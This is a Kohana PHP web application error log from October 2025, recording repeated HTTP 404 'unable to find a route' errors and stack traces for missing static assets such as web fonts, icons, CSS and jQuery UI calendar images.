2025-10-24 19:03:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Light-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Regular-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/fonts/Sansation_Bold-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/carbontype/carbontype-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/key_tab_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/key_tab_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/key_tab_divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/key_tab_divider.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:03:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:03:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/font/helveticaneue-condensed/helveticaneue-condensed-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/banner_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/banner_shadow.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/price_banner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/price_banner.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon3.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/support_icon1.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/body_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/body_bg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/calculate_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/calculate_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/keyben_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/images/keyben_icon.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_ffffff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_ffffff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_fbdb93_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_fbdb93_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/reset.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/reset.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_diagonal-maze_20_6e4f1c_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_diagonal-maze_20_6e4f1c_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_ffffff_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_ffffff_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:04:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/calActiveBg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:04:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/css/images/backgrounds/calActiveBg.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_10_f8f7f6_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_10_f8f7f6_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_d3c05a_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_d3c05a_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/img/icons/zoom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/admin/img/icons/zoom.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_10_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_10_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_15_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:05:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:05:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Regular-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:21 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:21 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Bold_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
